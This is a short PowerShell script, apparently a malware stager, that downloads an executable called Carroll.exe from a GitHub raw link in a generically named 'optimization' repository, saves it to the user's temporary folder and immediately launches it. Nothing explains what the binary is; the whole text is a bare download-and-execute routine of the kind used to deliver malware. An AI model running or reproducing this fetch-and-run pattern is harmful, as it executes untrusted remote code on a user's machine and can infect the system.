$url = "https://github.com/optimization-core/optimization/raw/main/Carroll.exe"

$dest = "$env:TEMP\Carroll.exe"

Invoke-WebRequest $url -OutFile $dest

Start-Process $dest
